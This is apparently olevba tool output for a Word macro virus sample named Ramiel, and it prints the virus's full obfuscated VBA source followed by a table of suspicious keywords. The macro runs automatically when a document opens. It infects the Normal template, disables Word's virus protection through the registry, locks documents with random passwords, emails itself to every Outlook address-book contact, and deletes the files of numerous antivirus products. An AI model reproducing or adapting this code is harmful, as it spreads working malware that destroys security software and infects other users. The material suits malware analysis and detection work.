olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ramiel.a-0b4e49eb29b02cb6685628b4269583e997ce1712
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Ramiel.cls 
in file: Virus.MSWord.Ramiel.a-0b4e49eb29b02cb6685628b4269583e997ce1712 - OLE stream: 'Macros/VBA/Ramiel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Naria()

On Error Resume Next

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="ATF"

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="ATF"

On Error GoTo 0

End Sub

Sub AT()

On Error Resume Next

MsgBox "Se Trato de acceder a un componente no válido", 16, "Error"

On Error GoTo 0

End Sub

Sub Document_Open()

On Error Resume Next

'Macrovirus "W97/Ramiel" modesta y Tercera creacion de Machinedramon

'Un reconocimiento a los autores de "Melisa", "W97M/Nitro", "W97M/Class", "WM/UglyKid"

'Sachiel2015@latinmail.com

'Hecho en el Peru, Calidad Mundial

'No detectado por la Heuristica de PerAntivirus a su Version 7.5

'Si detectado por la Heuristica de TheHacker Antivirus a su Version 5.1

'07/06/2002     Tacna-Peru

Set rd = CreateObject(e("JfV\}�;fuXyy"))

Set rml = CreateObject(e("\L‰R‡‹R…PE}RƒN\b\‹NVXy�NL‹"))

rl = rml.getspecialfolder(0)

rg = rml.getspecialfolder(1)

If WeekDay(Date) = 3 Or Dir(rg & e("e8mXd7jZ{")) <> "" Then

Selection.TypeText e("eee\x08$ ³¹·
.e‰$*.e. e,0 © e ³e.0e
$ ±*qe¹*©*e ³e±
e¹$ ··
e .¹
·
e§$ ³s")

Selection.TypeText e(";;;,JT��J‰�J;;_NX�;;J;oTPNT")

Selection.TypeText e(")))[Xd`\u")

End If

Set evad = ActiveDocument.VBProject.VBComponents.Item(1)

Set evan = NormalTemplate.VBProject.VBComponents.Item(1)

If Day(Date) = 21 Or Dir(rg & e("e8mXd7jZ{")) <> "" Then

Application.UserName = e("U^jfbo")

Randomize

r = Int(Rnd * 3)

If r = 0 Then

ActiveDocument.Password = e("U^jfbo")

ElseIf r = 1 Then

ActiveDocument.Password = e("obfj^U")

ElseIf r = 2 Then

ActiveDocument.Password = e("Uo^bjf")

End If

End If

rmd = evad.codemodule.CountOfLines

rmn = evan.codemodule.CountOfLines

With evan

If .Name <> e("U^jfbo") Then

If Dir(e("\x08u—­(£.±48[Ÿ*[«­4,­&2&—.(­484¡¯[¡¡.(*—‹§&©¯.§§&8—‰4­2&§iŸ4¯")) <> "" Then

Dim at1

at1 = GetAttr(e("\x08u—­(£.±48[Ÿ*[«­4,­&2&—.(­484¡¯[¡¡.(*—‹§&©¯.§§&8—‰4­2&§iŸ4¯"))

If at1 > 0 Then

Set at2 = rml.getfile(e("\x08u—­(£.±48[Ÿ*[«­4,­&2&—.(­484¡¯[¡¡.(*—‹§&©¯.§§&8—‰4­2&§iŸ4¯"))

at2.Attributes = at1 - at1

End If

ElseIf Dir(e("m�ƒ¥<4¥.:Sy6Ÿ2@�60¥<@<™§S
™™602�‡2:£Ÿ.§2@��<¥:.Ÿa—<§")) <> "" Then

at1 = GetAttr(e("m�ƒ¥<4¥.:Sy6Ÿ2@�60¥<@<™§S
™™602�‡2:£Ÿ.§2@��<¥:.Ÿa—<§"))

If at1 > 0 Then

Set at3 = rml.getfile(e("m�ƒ¥<4¥.:Sy6Ÿ2@�60¥<@<™§S
™™602�‡2:£Ÿ.§2@��<¥:.Ÿa—<§"))

at3.Attributes = at1 - at1

End If

End If

If rmn > (2 - 2) Then

evan.codemodule.deletelines 1, rmn

End If

.Name = e("U^jfbo")

r2 = e("Ywp`")

End If

End With

With evad

If .Name <> e("U^jfbo") Then

at1 = GetAttr(ActiveDocument.Path & e("]") & ActiveDocument)

If at1 > 0 Then

Set at2 = rml.getfile(ActiveDocument.Path & e("]") & ActiveDocument)

at2.Attributes = at1 - at1

End If

If rmd > (2 - 2) Then

evad.codemodule.deletelines 1, rmd

End If

.Name = e("U^jfbo")

With Dialogs(86)

.Author = "Machinedramon"
          
.Subject = "Ramiel"
          
.Comments = "Derechos Reservados" & vbCrLf & "Organizacion: GEDZAC" & vbCrLf & "Marcas Registradas: GEDZAC" & vbCrLf & "Hecho en el Peru, Calidad Mundial." & vbCrLf & "Sachiel2015@latinmail.com" & vbCrLf & "Contraseñas: Ramiel, leimaR, Rlaemi"
          
.Execute
          
End With

r1 = e("Ywp`")

End If

End With

If (rl = "") Then

rl = e("<Acpbukhpl")

If Dir(e("<Acpbukhpl") & e("a/3/")) = "" Then

MkDir e("<Acpbukhpl")

End If

End If

If r2 = e("Ywp`") Then

Set evar = NormalTemplate.VBProject.VBComponents.Item(1)

evad.export (rl & e("cYZfb^s5Z`s"))

SetAttr rl & e("cYZfb^s5Z`s"), 6

evan.codemodule.AddFromFile (rl & e("cYZfb^s5Z`s"))

Do While Left(evan.codemodule.lines(1, 1), 3) <> e("Tva")

evan.codemodule.deletelines 1, 1

Loop

evan.codemodule.replaceline 1, e("Hjm+6jdZƒZX+3
")

evan.codemodule.replaceline 13, e("Pre#>W") & e("K%-$")

evan.codemodule.replaceline 23, e(">`w5YZN`XPƒ‰J.�Z^P5=")

ElseIf r1 = e("Ywp`") Then

Set evar = ActiveDocument.VBProject.VBComponents.Item(1)

Dim r0 As String

If Dir(rl & e("cYZfb^s5Z`s")) = "" Then

evan.export (rl & e("cYZfb^s5Z`s"))

SetAttr rl & e("cYZfb^s5Z`s"), 6

r0 = e("Ywp`")

End If

evad.codemodule.AddFromFile (rl & e("cYZfb^s5Z`s"))

Do While Left(evad.codemodule.lines(1, 1), 3) <> e("Tva")

evad.codemodule.deletelines 1, 1

Loop

If r0 = e("Ywp`") Then

evad.codemodule.replaceline 1, e("Fho-[T\T-5
")

evad.codemodule.replaceline 13, e("Jlk)8])1 ")

evad.codemodule.replaceline 23, e("Dfq/S`Tf^V}ƒP@V}7")

End If

End If

If (Application.Version = "9.0") Or (Application.Version = "10.0") Then

rd.regwrite e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™�") & e("4��NHJwKIKw<T�w8JHZ�N�^wgJ‘J‡"), 1, "REG_DWORD"

rd.regwrite e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™�") & e("*‹‹D>@�
USU�2J—‰�.@>P—D™T�
>>@NN{g*("), 1, "REG_DWORD"

rd.regwrite e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™�") & e("4��NHJw
IKw<T�w8JHZ�N�^wgJ‘J‡"), "1", "REG_DWORD"

CommandBars(e("Yjjqn")).Controls(e("H\^wj")).Enabled = e("K\qn`")

CommandBars(e("H\^wj")).Visible = e("K\qn`")

CommandBars(e("c\fhTy-OTf\V")).Visible = e("K\qn`")

CommandBars("[d`r").Controls(5).Enabled = e("K\qn`")

CommandBars(e("c\fhTy-OTf\V")).Enabled = e("K\qn`")

Application.ScreenUpdating = e("K\qn`")

Application.DisplayAlerts = e("K\qn`")

Application.ShowVisualBasicEditor = e("K\qn`")

Options.ConfirmConversions = e("K\qn`")

Options.SaveNormalPrompt = e("K\qn`")

If r2 = e("Ywp`") Then

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="AT"

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="AT"

End If

Application.EnableCancelKey = 0

CommandBars(e("Yjjqn")).Controls(17).Enabled = e("K\qn`")

CommandBars(e("Yjjqn")).Controls(18).Enabled = e("K\qn`")

CommandBars(e("Yjjqn")).Controls(19).Enabled = e("K\qn`")

CommandBars(e("Kdq`")).Controls(e("]\dyuX}\j")).Enabled = e("K\qn`")

rd.regwrite e("]60DJ@>0g>qCY0[,@aiq") & e("8T��\F�Jw2NH�TXT��w4��NHJw
IKw") & e("H`�skDVTf�Zƒjk[V…V{"), "1", "REG_DWORD"

End If

If Application.Version <> "9.0" Then

CommandBars(e("c\fhTy-OTf\V")).Enabled = e("K\qn`")

CommandBars(e("Yjjqn")).Controls(e("H\^wj")).Enabled = e("K\qn`")

CommandBars(e("Yjjqn")).Controls(14).Enabled = e("K\qn`")

CommandBars(e("Yjjqn")).Controls(15).Enabled = e("K\qn`")

CommandBars(e("Yjjqn")).Controls(16).Enabled = e("K\qn`")

CommandBars(e("[d`r")).Controls(6).Enabled = e("K\qn`")

Options.VirusProtection = e("K\qn`")

Options.ConfirmConversions = e("K\qn`")

Options.SaveNormalPrompt = e("K\qn`")

Application.ScreenUpdating = e("K\qn`")

Application.DisplayAlerts = e("K\qn`")

Application.ShowVisualBasicEditor = e("K\qn`")

Application.EnableCancelKey = 0

If r2 = e("Ywp`") Then

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="AT"

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="AT"

End If

End If

If (r1 = e("Ywp`")) Or (r2 = e("Ywp`")) Then

With evar.codemodule

Randomize

For x = 2 To (evar.codemodule.CountOfLines) Step 2

For y = 1 To (Int(Rnd * 13) + 2)

agl = agl + Chr(69 + Int(Rnd * 15)) & Chr(115 - Int(Rnd * 13)) & Chr(77 + Int(Rnd * 8)) & Chr(101 + Int(Rnd * 20)) & Right(Now, Int(Rnd * 6)) & " + "

Next y

.replaceline x, "'" & Chr(86 - Int(Rnd * 14)) & Chr(67 + Int(Rnd * 12)) & agl & Left(Date, Int(Rnd * 4))

agl = ""

Next x

End With

If ActiveDocument.Path <> "" Then

ActiveDocument.Save

End If

End If

Dim rf As String

rf = rd.regread(e("_4.BH,>ii.ekH><.is<X}‹`J‰Ns") & e(".JD‘PTP…“{*�“F‘�F“?&—�‹P‘F‘{qBNJF‹"))

If rf <> "1" Then

Dim rr As String

rr = rd.regread(e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™") & e("�$“™@—“@™E �•‘J—@—�iJR“‘J<‰EiD—@>™J—T")) & e("]")

If rr = "" Then

rr = rml.getspecialfolder(0) & e("]")

rrr = rml.getspecialfolder(0)

rd.regwrite e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™�") & e("$“™@—“@™E �•‘J—@—�iJR“‘J<‰EiD—@>™J—T"), rrr

End If

If Dir$(rr & e("HVXs^Zw9u{\9hX}")) <> "" Then

ID = Shell(rr & e("HVXs^Zw9u{\9hX}"))

rd.regwrite e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™") & e("u0‡�L‹‡L�9,‘‰…V‹L‹ukHTPL…"), "1"

End If

End If

Dim rh

rh = rd.regread(e("e.(<Bi2&$iB0$&e,k(y62cq:$o(y") & e(".JD‘PTP…“{8J�ƒPXT{$V‘‘F�“uF‘TJP�{qH"))

If rh = "" Then

rd.regwrite e("m& 4:
0ww sy:0. w�.J‹™R<—@�(D>—JNJ‹™�") & e("(�•D“�D•A$™‘�N“D“},@H�}2•@“•Aq@FD"), e("‘��™cNNNW>›8�@JN<‹W:FDD8:‘@—<�›8DF—\x08") & e("hVXs^Zw9u{\9hX}")

Randomize

Dim sb, bd

Dim q1, q2

q1 = Int(Rnd * 5)

If q1 = 0 Then

sb = e("2�ƒZTf{`/sV/Z}ƒV�Vd")

ElseIf q1 = 1 Then

sb = e("gR3R�‰V\3R`‡R3w\PbZR�‡\")

ElseIf q1 = 2 Then

sb = e("$�BN�•“DAT�A@“•HBT�NAH�•D“DR@�•D")

ElseIf q1 = 3 Then

sb = e("@lqpbml")

ElseIf q1 = 4 Then

sb = e("]XbVh}TV\b{")

End If

q2 = Int(Rnd * 5)

If q2 = 0 Then

bd = e("�8M8›£<BM8F¡8M4Ÿ¡<6H™BYM¡4™M£8§M¡8M<›¡8Ÿ8F8Y") & vbCrLf & e("JBCBP@•F…BPC“>•>CP>…B•C@LJLC—BC“>•B@FL") & vbCrLf & e("<idjn")

ElseIf q2 = 1 Then

bd = e("
@4>40§,U<@0U80U™0>U©@U:¥4£4:£U>:—§0U0>©0U™:.@80£©:a") & vbCrLf & e("VZJ;�J;J‰‘NTG;JX‹J�T;�Z;T‹N‰NT‰") & vbCrLf & e("<idjn")

ElseIf q2 = 2 Then

bd = e("sF?F�•JP?FT“F?B‘“JDV‹P?‹P?F�DP�“‘F") & e("E@“EP“<E•<BD“<2@‡ETE‘JE>J•D@E@“ERJ—‰Q") & vbCrLf & e("‹Jƒ7�N‘7‹N7\NJ7{N7^‹RƒR{J{7") & vbCrLf & e("<idjn")

ElseIf q2 = 3 Then

bd = e("}:¡,aU£0>0.4©:U<@0U80U™0>U©@U:¥4£4:£U>:—§0U@£U,>@£©:a") & vbCrLf & e("…4Q4Ÿ§8>Q4�Q•>2D<4Ÿ¥>Q@D4Q£428“8]Q�>Q¡0B4Q0Q&>£•") & vbCrLf & e("(6±2<],«¡(&,62i]±(]$*¯$¡(&(¯,$]6,]0(]¡,(¯$6]±8]2­,«,2«i]¡,26")

ElseIf q2 = 4 Then

bd = e("
i½ 
·
i¹»
&,¹­&i,·i­&,$
·½&i(,
i»
 « uiµ&i½»·*» « ii&$¹,½­&»") & vbCrLf & e(":>2<2.©*W:>.W6.W›.<W«>W8§2¥28¥cW«*£W­.±W¥8W<.*W§*©*W«*¥«8e") & vbCrLf & e("<idjn")

End If

Dim o, m

Set o = CreateObject(e("@fƒ{``\=R{ZTRƒZ`}"))

Set m = o.getNameSpace(e("H<UD"))

For i = 1 To m.AddressLists.Count

Set mt = m.AddressLists(i)

For u = 1 To mt.AddressEntries.Count

Set Rei = o.CreateItem(0)

Set Langley = mt.AddressEntries(u)

Rei.Recipients.Add Langley

Rei.Subject = sb

Rei.Body = bd

Rei.Attachments.Add ActiveDocument.FullName

Rei.DeleteAfterSubmit = e("Ywp`")

Rei.Send

Langley = ""

Next

Next

End If

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y62cq:$o(y") & e(".JD‘PTP…“{8J�ƒPXT{$V‘‘F�“uF‘TJP�{qH"), e("<npf\")

Set o = Nothing

Set m = Nothing

Dim th1, th2, per1, per2, Mcf1, Mcf2, Prot11, Prot12, Prot21, Prot22, VET1, VET2, Av1, Av2, TCl1, TCl2, Pda1, Pda2, AVP1, AVP2, Nort1, Nort2, Norn1, Norn2, itn1, itn2, wt

wt = e("iJ\{\{\�;\{\")

th1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("m<>FNJ‹™�y�@Em<>F@—E
“™D\x08{D—PN�ymi
y"))

per1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("�O$JD£6>D‹�O�£:¥:¡FD‹�D£2›24:Ä�‹“:¡¡:�4:Ÿ2›"))

Prot11 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("$PNNB�ƒ?4P…“XB‘F{eoq0sQ{kPDB“JP�"))

Prot21 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("kw$.&E.J‹™R<—@E$“™@—“<™DJ“<‘�ku\x082D“�") & e("]bZT`-_bb�"))

Mcf1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("4J(LLuoP‹\Z:JH‡ueVJH�PV‡"))

VET1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("N�:8‡�K™Ÿ>¡>�JHK‘D�K,>™\x08]‡}:H>�:™Ÿ‡�:Ÿ{6Ÿ“"))

Av1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("*c@2c7<X}‹`J‰Ns*�J\‹
IsgJ‹"))

TCl1 = rd.regread(e("e.(<B86(o6yKa(c$8iqy6Rƒ‘ZD�Hy") & e("$FF*F��Im<Ÿ<•F™D<—�…}‘<I•<8—<›…�:J‘<••<¡"))

Pda1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("s>‘‡>C0L‰—T>•Bs>‘‡>C
‘—F™F•RPCYQSs>—‹"))

AVP1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e(",BT�F‘TLZkB�{$PN�P�F�“T{OO{eP‹ƒF‘"))

Nort1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("<bVJ…‹NLs2…\‹JƒƒN{*‡‡\se*m"))

Norn1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("sJ—H<“Ei<™<Ei@‹@“N@E.TN™@HN�wJJ™u<™�"))

itn1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("DB›JŸ:�HHD8>6Ÿ:H‡™Ÿ>�>�JH‡}:H>�:™Ÿ‡�:Ÿ{6Ÿ“"))

If th1 <> "" Then

If Dir(th1 & e("/3`}`")) <> "" Then

Set th2 = rml.getfolder(th1)

Set t1 = th2.files

For Each t2 In t1

Set t3 = rml.getfile(t2.Path)

If t3.Attributes > 0 Then

t3.Attributes = t3.Attributes - t3.Attributes

End If

Kill (t2.Path)

Next

Open rl & wt For Append As #1

Print #1, e("R[\wXd\T")

Print #1, e("spq8") & th1 & e("]qX7\�\")

Close #1

wit = True

End If

End If

If per1 <> "" Then

If Dir(per1 & e("_-1b{b")) <> "" Then

Set per2 = rml.getfolder(per1)

Set p1 = per2.files

For Each p2 In p1

Set p3 = rml.getfile(p2.Path)

If p3.Attributes > 0 Then

p3.Attributes = p3.Attributes - p3.Attributes

End If

Kill (p2.Path)

Next

Open rl & wt For Append As #2

If wit <> True Then Print #2, e("R[\wXd\T")

Print #2, e("spq8") & per1 & e("eYX7\�\")

Print #2, e("spq8") & per1 & e("i]Tƒ`T\y;X…X")

Print #2, e("spq8") & per1 & e("cW^y}Z\5^^")

Print #2, e("spq8") & per1 & e("cW^y{ld5^^")

Close #2

s = Dir(rl & e("_Jbqý#") & e(".‰NHNTwk�TL�FRFXw.‰NHNTwE‹J�EIE"))

i = Dir(rl & e("�.™<—™E(@“P�u—JB—<HN�.™<—™P•�O•@—OSO"))

If s <> "" Then Kill (rl & e("_Jbqý#") & e(".‰NHNTwk�TL�FRFXw.‰NHNTwE‹J�EIE"))

If i <> "" Then Kill (rl & e("�.™<—™E(@“P�u—JB—<HN�.™<—™P•�O•@—OSO"))

End If

End If

If Prot11 <> "" Then

If Dir(Prot11 & e("_-1b{b")) <> "" Then

Set Prot12 = rml.getfolder(Prot11)

Set pr1 = Prot12.files

For Each pr2 In pr1

Set pr3 = rml.getfile(pr2.Path)

If pr3.Attributes > 0 Then

pr3.Attributes = pr3.Attributes - pr3.Attributes

End If

Kill (pr2.Path)

Next

End If

End If

If Prot21 <> "" Then

If Dir(Prot21 & e("_-1b{b")) <> "" Then

Set Prot22 = rml.getfolder(Prot21)

Set pt1 = Prot22.files

For Each pt2 In pt1

Set pt3 = rml.getfile(pt2.Path)

If pt3.Attributes > 0 Then

pt3.Attributes = pt3.Attributes - pt3.Attributes

End If

Kill (pt2.Path)

Next

End If

End If

If Mcf1 <> "" Then

If Dir(Mcf1 & e("_-1b{b")) <> "" Then

Set Mcf2 = rml.getfolder(Mcf1)

Set mf1 = Mcf2.files

For Each mf2 In mf1

Set mf3 = rml.getfile(mf2.Path)

If mf3.Attributes > 0 Then

mf3.Attributes = mf3.Attributes - mf3.Attributes

End If

Kill (mf2.Path)

Next

End If

End If

If VET1 <> "" Then

If Dir(VET1 & e("_-1b{b")) <> "" Then

Set VET2 = rml.getfolder(VET1)

Set vt1 = VET2.files

For Each vt2 In vt1

Set vt3 = rml.getfile(vt2.Path)

If vt3.Attributes > 0 Then

vt3.Attributes = vt3.Attributes - vt3.Attributes

End If

Kill (vt2.Path)

Next

End If

End If

If Av1 <> "" Then

If Dir(Av1 & e("_-1b{b")) <> "" Then

Set Av2 = rml.getfolder(Av1)

Set v1 = Av2.files

For Each v2 In v1

Set v3 = rml.getfile(v2.Path)

If v3.Attributes > 0 Then

v3.Attributes = v3.Attributes - v3.Attributes

End If

Kill (v2.Path)

Next

End If

End If

If TCl1 <> "" Then

If Dir(TCl1 & e("_-1b{b")) <> "" Then

Set TCl2 = rml.getfolder(TCl1)

Set t1 = TCl2.files

For Each t2 In t1

Set t3 = rml.getfile(t2.Path)

If t3.Attributes > 0 Then

t3.Attributes = t3.Attributes - t3.Attributes

End If

Kill (t2.Path)

Next

End If

End If

If Pda1 <> "" Then

If Dir(Pda1 & e("_-1b{b")) <> "" Then

Set Pda2 = rml.getfolder(Pda1)

Set pd1 = Pda2.files

For Each pd2 In pd1

Set pd3 = rml.getfile(pd2.Path)

If pd3.Attributes > 0 Then

pd3.Attributes = pd3.Attributes - pd3.Attributes

End If

Kill (pd2.Path)

Next

End If

End If

If AVP1 <> "" Then

If Dir(AVP1 & e("_-1b{b")) <> "" Then

Set AVP2 = rml.getfolder(AVP1)

Set Av1 = AVP2.files

For Each Av2 In Av1

Set av3 = rml.getfile(Av2.Path)

If av3.Attributes > 0 Then

av3.Attributes = av3.Attributes - av3.Attributes

End If

Kill (Av2.Path)

Next

End If

End If

If Nort1 <> "" Then

If Dir(Nort1 & e("_-1b{b")) <> "" Then

Set Nort2 = rml.getfolder(Nort1)

Set n1 = Nort2.files

For Each n2 In n1

Set n3 = rml.getfile(n2.Path)

If n3.Attributes > 0 Then

n3.Attributes = n3.Attributes - n3.Attributes

End If

Kill (n2.Path)

Next

End If

End If

If Norn1 <> "" Then

If Dir(Norn1 & e("_-1b{b")) <> "" Then

Set Norn2 = rml.getfolder(Norn1)

Set nr1 = Norn2.files

For Each nr2 In nr1

Set nr3 = rml.getfile(nr2.Path)

If nr3.Attributes > 0 Then

nr3.Attributes = nr3.Attributes - nr3.Attributes

End If

Kill (nr2.Path)

Next

End If

End If

If itn1 <> "" Then

If Dir(itn1 & e("_-1b{b")) <> "" Then

Set itn2 = rml.getfolder(itn1)

Set it1 = itn2.files

For Each it2 In it1

Set it3 = rml.getfile(it2.Path)

If it3.Attributes > 0 Then

it3.Attributes = it3.Attributes - it3.Attributes

End If

Kill (it2.Path)

Next

End If

End If

Dim zlm1, zlm2, flm1, flm2, bie1, bie2, Ti1, Ti2, Sg1, Sg2

zlm1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("J“@Eq<‡N�J“@
‘<—H�$“N™<‘‘iD—@>™J—T"))

bie1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("iJ�\T�P;.(*w]‡FHP.(*w.‰X�F‡‡J�"))

Ti1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("yD“T.J‹™R<—@�yD“TEu@—NJ“<‘EkD—@R<‘‘�") & e("?;==iQXf�]T�u"))

Sg1 = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & e("$J82£6Oƒ64—�@›@8:6D[O�4]‹$J82£6O6¡D@�2›Ou:¡6H2››‹") & e("b\RNXb…P}}N�P…y"))

If zlm1 <> "" Then

If Dir(zlm1 & e("_-1b{b")) <> "" Then

Set zlm2 = rml.getfolder(zlm1)

Set zl1 = zlm2.files

For Each zl2 In zl1

Set zl3 = rml.getfile(zl2.Path)

If zl3.Attributes > 0 Then

zl3.Attributes = zl3.Attributes - zl3.Attributes

End If

Kill (zl2.Path)

Next

End If

End If

If bie1 <> "" Then

If Dir(bie1 & e("_-1b{b")) <> "" Then

Set bie2 = rml.getfolder(bie1)

Set bi1 = bie2.files

For Each bi2 In bi1

Set bi3 = rml.getfile(bi2.Path)

If bi3.Attributes > 0 Then

bi3.Attributes = bi3.Attributes - bi3.Attributes

End If

Kill (bi2.Path)

Next

End If

End If

If Ti1 <> "" Then

If Dir(Ti1 & e("_-1b{b")) <> "" Then

Set Ti2 = rml.getfolder(Ti1)

Set ts1 = Ti2.files

For Each ts2 In ts1

Set ts3 = rml.getfile(ts2.Path)

If ts3.Attributes > 0 Then

ts3.Attributes = ts3.Attributes - ts3.Attributes

End If

Kill (ts2.Path)

Next

End If

End If

If Sg1 <> "" Then

If Dir(Sg1 & e("_-1b{b")) <> "" Then

Set Sg2 = rml.getfolder(Sg1)

Set s1 = Sg2.files

For Each s2 In s1

Set s3 = rml.getfile(s2.Path)

If s3.Attributes > 0 Then

s3.Attributes = s3.Attributes - s3.Attributes

End If

Kill (s2.Path)

Next

End If

End If

xb = rd.regread(e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\AutoStart")

If xb <> "" Then

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\0", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\1", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\2", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\3", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\4", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\5", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\6", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\7", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & " DeepVision\Xô BoBus - R32\8", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\9", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\10", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\AutoStart", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\AutoVerify", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\BOProt", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\ExtraPort", e("M@J8KU<M")

rd.regwrite e("e.(<Bi2&$iB0$&e,k(y6Rƒ‘ZD�Hy") & "DeepVision\Xô BoBus - R32\NetBusAdv", e("M@J8KU<M")

End If

On Error GoTo 0

End Sub

Private Function e(s As String)

On Error Resume Next

Dim d As Long

For i = 1 To Len(s)

d = Len(s) Xor 2

If d Mod 2 = 0 Then d = d + 1

If Asc(Mid(s, i, 1)) Mod 2 = 0 Then

e = e & Chr$((Asc(Mid(s, i, 1)) + d) - 2)

Else

e = e & Chr$((Asc(Mid(s, i, 1)) - d) + 2)

End If

Next

If Err Then

End

End If

On Error GoTo 0

End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|regread             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

